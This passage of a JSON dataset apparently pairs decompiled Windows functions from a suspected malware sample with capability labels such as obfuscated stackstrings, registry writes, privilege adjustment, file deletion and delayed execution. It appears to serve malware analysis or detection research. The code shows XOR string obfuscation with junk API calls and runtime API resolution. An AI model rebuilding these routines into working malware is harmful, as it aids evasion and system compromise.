(*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        return;\n    }\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 679
    },
    "0040fcd2": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "set registry value"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040fcd2(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t hKey;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_14h = *0x412140;\n    var_48h = 0x6f586a1b;\n    var_44h = 0x6a3c6323;\n    var_40h = 0x63246f40;\n    var_3ch = 0x6f526a3a;\n    var_38h = 0x6a056319;\n    var_34h._0_2_ = 0x6f5e;\n    var_34h._2_1_ = 0x26;\n    stack0xffffffcb = 0x586a3a63;\n    stack0xffffffcf = 0x2763366f;\n    stack0xffffffd3 = 0x316f516a;\n    var_28h._3_1_ = 99;\n    var_24h._0_1_ = 0x48;\n    var_24h._1_1_ = 0x6a;\n    var_20h = 0x6f376a48;\n    var_1ch._0_2_ = 0x6345;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x4d);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_8h = 6;\n    iVar5 = 0;\n    var_18h = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n        if (iVar3 != 0x92f498) {\n            *(iVar5 + iVar2) = *(&var_20h + iVar5 % var_8h) ^ (iVar5 + iVar2)[&var_48h - iVar2];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x26);\n    iVar5 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(hKey, iVar2, 0, 0xf003f, &var_4h);\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar5 == 0) {\n        var_40h = 0x373f7225;\n        var_3ch = 0x720a363f;\n        var_38h = 0x36223707;\n        var_34h._0_2_ = 0x7201;\n        var_34h._2_1_ = 6;\n        stack0xffffffcb = 0x1e362c37;\n        stack0xffffffcf = 0x24371872;\n        stack0xffffffd3 = 0x2e721c36;\n        var_28h._3_1_ = 0x37;\n        var_24h._0_1_ = 0x4d;\n        var_24h._1_1_ = 0x36;\n        var_20h = 0x374b7266;\n        var_1ch._0_2_ = 0x364d;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x3d);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar5 = 0;\n        hKey = &var_40h - iVar2;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_CloseClipboard)();\n            if (iVar3 != 0xb5021e) {\n                *(iVar5 + iVar2) = *(&var_20h + iVar5 % var_8h) ^ (iVar5 + iVar2)[&var_40h - iVar2];\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0x1e);\n        (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(var_4h, iVar2, 0, 4, &var_14h, 4);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_4h);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        iVar2 = var_18h;\n    }\n    uVar1 = (*pcVar4)(0, iVar2);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    return;\n}\n",
        "token_count": 1187
    },
    "004028ec": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint fcn.004028ec(void)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = fcn.004022e6();\n        if (iVar1 != 0) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n    }\n    fcn.0040229e();\n    return 0;\n}\n",
        "token_count": 80
    },
    "0040a973": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.0040a973(void)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar1 == 0) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)();\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "0040cf97": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040cf97(uint param_1)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint lpBuffer;\n    uint var_8h;\n    int32_t lpNumberOfBytesRead;\n    \n    var_8h = param_1;\n    do {\n        *0x41cdd8 = 0;\n        iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)(param_1, 0x80000000, 3, 0, 3, 0, 0);\n        if (iVar2 != 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar2, &lpBuffer, 0x200, &lpNumberOfBytesRead, 0);\n            while ((iVar3 != 0 && (param_1 = var_8h,  lpNumberOfBytesRead != 0))) {\n                puVar4 = &lpBuffer;\n                iVar3 = lpNumberOfBytesRead;\n                do {\n                    uVar1 = *puVar4;\n                    puVar4 = puVar4 + 1;\n                    *0x41cdd8 = *0x41cdd8 >> 8 ^ *((uVar1 ^ *0x41cdd8 & 0xff) * 4 + 0x410530) ^ 0xd202ef8d;\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n                iVar3 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar2, &lpBuffer, 0x200, &lpNumberOfBytesRead, 0);\n                param_1 = var_8h;\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n            iVar2 = fcn.0040d9f1(0x41cd80);\n            if (iVar2 == 0) {\n                return;\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    } while( true );\n}\n",
        "token_count": 451
    },
    "0040a77c": {
        "rules": [
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040a77c(uint param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    uint lpType;\n    uint lpcbData;\n    uint phkResult;\n    \n    phkResult = 0;\n    uVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyA)(0x80000002, param_1, &phkResult);\n    bVar2 = uVar1 == 0;\n    if (bVar2) {\n        lpType = 1;\n        lpcbData = 0x400;\n        (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(phkResult, param_2, 0, &lpType, 0x41cdf0, &lpcbData);\n        uVar1 = (*_sym.imp.ADVAPI32.dll_RegCloseKey)(phkResult);\n    }\n    return uVar1 & 0xffffff00 | bVar2;\n}\n",
        "token_count": 219
    },
    "004073b6": {
        "rules": [
            "contain loop",
            "link function at runtime on Windows",
            "get disk information"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004073b6(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_20h = 0x1b250437;\n    var_1ch = 0x3c0d2517;\n    var_18h = 0x3d100a22;\n    var_14h._0_1_ = 0x61;\n    var_10h = 0x6f576d61;\n    var_ch._0_2_ = 0x4462;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_8h = iVar4;\n    do {\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n        if (iVar5 != 0x5bf35e) {\n            var_4h = 6;\n            *(iVar7 + iVar4) = *(&var_10h + iVar7 % 6) ^ (iVar7 + iVar4)[&var_20h - iVar4];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xd);\n    var_20h = 0x5c11271a;\n    var_1ch = 0x51711d37;\n    var_18h = 0x2e1d361c;\n    var_14h._0_1_ = 99;\n    var_10h = 0x32634271;\n    var_ch._0_2_ = CONCAT11(var_ch._1_1_, 0x52);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_4h = &var_20h - iVar4;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n        iVar5 = var_8h;\n        if (iVar6 != 0x8e2b06) {\n            var_4h = 5;\n            *(iVar7 + iVar4) = *(&var_10h + iVar7 % 5) ^ (iVar7 + iVar4)[&var_20h - iVar4];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xd);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar4, var_8h);\n    (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar5);\n    (*pcVar1)(uVar3);\n    return;\n}\n",
        "token_count": 803
    },
    "0040765b": {
        "rules": [
            "contain loop",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.0040765b(int32_t param_1)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    uint var_50h;\n    uint var_49h;\n    uint var_45h;\n    uint var_41h;\n    uint var_3dh;\n    uint var_36h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_1h._0_1_ = *0x41ca94;\n    var_18h = param_1;\n    if (*0x41ccc4 == NULL) {\n        var_50h._0_2_ = 0x1726;\n        var_ch = 6;\n        var_50h._2_1_ = 6;\n        stack0xffffffaf = 0x1f2d6259;\n        var_49h = 0x33031319;\n        var_45h = 0x470f1e3f;\n        var_41h = 0x231b105b;\n        var_3dh._0_2_ = 0x151d;\n        stack0xffffffc2 = 0xc120d24;\n        var_36h = 0x68380018;\n        var_20h = 0x6f717871;\n        var_1ch._0_2_ = 0x6856;\n        var_3dh._2_1_ = var_50h._2_1_;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar7 = 0;\n        var_10h = &var_50h - iVar3;\n        var_14h = iVar3;\n        do {\n            iVar4 = (*pcVar6)();\n            if (iVar4 != 0xe900c7) {\n                *(iVar7 + iVar3) = *(&var_20h + iVar7 % var_ch) ^ (iVar7 + iVar3)[var_10h];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0x1e);\n        var_30h = 0x5c11271a;\n        var_2ch = 0x51711d37;\n        var_28h = 0x2e1d361c;\n        var_24h._0_1_ = 99;\n        var_ch = 0x32634271;\n        var_8h._0_1_ = 0x52;\n        uVar2 = (*pcVar6)(8, 0xe);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar7 = 0;\n        var_10h = &var_30h - iVar3;\n        do {\n            iVar5 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n            iVar4 = var_14h;\n            if (iVar5 != 0x8e2b06) {\n                var_10h = 5;\n                *(iVar7 + iVar3) = *(&var_ch + iVar7 % 5) ^ (iVar7 + iVar3)[&var_30h - iVar3];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xd);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar3, var_14h);\n        *0x41ccc4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n        pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        uVar2 = (*pcVar1)(0, iVar4);\n        (*pcVar6)(uVar2);\n        pcVar6 = *0x41ccc4;\n        if (*0x41ccc4 == NULL) goto code_r0x004077cf;\n    }\n    iVar3 = var_18h;\n    pcVar6 = (**0x41ccc4)(var_18h);\n    if (pcVar6 != '\\0') {\n        *0x41ca94 = iVar3 != 0;\n    }\ncode_r0x004077cf:\n    return pcVar6 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 1153
    },
    "0040d97f": {
        "rules": [
            "query environment variable"
        ],
        "decompiled_code": "\nuchar * __fastcall fcn.0040d97f(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    uint nSize;\n    uint var_4h;\n    \n    puVar4 = NULL;\n    if ((param_1 != 0) && (iVar1 = (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(param_1, 0, 0),  iVar1 != 0)) {\n        iVar3 = iVar1 * 2 + 8;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, iVar3);\n        puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        puVar5 = puVar4;\n        if (puVar4 != NULL) {\n            for (; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            iVar1 = (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(param_1, puVar4, iVar1);\n            if (iVar1 == 0) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar4);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                puVar4 = NULL;\n            }\n        }\n    }\n    return puVar4;\n}\n",
        "token_count": 338
    },
    "0040468d": {
        "rules": [
            "modify access privileges"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040468d(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint NewState;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint lpLuid;\n    uint var_8h;\n    int32_t TokenHandle;\n    \n    TokenHandle = param_2;\n    if (param_2 == 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x28, &TokenHandle);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar3);\n        if (iVar2 != 0) {\n            iVar1 = (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, param_1, &lpLuid);\n            iVar2 = 0;\n            if (iVar1 != 0) {\n                var_18h = lpLuid;\n                var_14h = var_8h;\n                NewState = 1;\n                var_10h = 2;\n                iVar2 = (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0x10, 0, 0);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n        }\n    }\n    else {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, param_1, &lpLuid);\n        iVar2 = 0;\n        if (iVar1 != 0) {\n            var_18h = lpLuid;\n            var_14h = var_8h;\n            NewState = 1;\n            var_10h = 2;\n            iVar2 = (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0x10, 0, 0);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 452
    },
    "0040e0ae": {
        "rules": [
            "delete file"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040e0ae(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    \n    uVar4 = 0;\n    iVar1 = fcn.0040d97f();\n    if (iVar1 != 0) {\n        param_1 = iVar1;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_DeleteFileW)(param_1);\n    if (iVar2 == 0) {\n        uVar4 = fcn.0040890f();\n    }\n    if (iVar1 != 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar1);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return uVar4;\n}\n",
        "token_count": 191
    }
}